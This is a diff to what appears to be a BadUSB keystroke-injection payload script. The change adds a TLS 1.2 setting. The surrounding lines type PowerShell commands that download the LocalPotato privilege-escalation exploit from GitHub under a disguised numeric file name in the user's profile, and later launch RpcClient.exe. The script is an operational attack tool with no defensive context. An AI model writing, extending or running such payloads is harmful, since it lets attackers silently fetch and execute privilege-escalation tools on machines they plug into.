@@ -36,6 +36,10 @@ DELAY 750
 LEFTARROW
 DELAY 500
 ENTER
+DELAY 500
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+ENTER
+DELAY 500
 STRING $url = "https://github.com/ShiroiBoushi/LocalPotato/raw/main/LocalPotato.exe"; $output = "$env:userprofile/1281687.exe"; Invoke-WebRequest -Uri $url -OutFile $output
 ENTER
 REM localpotato downloaded
@@ -57,3 +61,4 @@ REM RpcClient.exe downloaded
 STRING start RpcClient.exe
 ENTER
 DELAY 15000
+
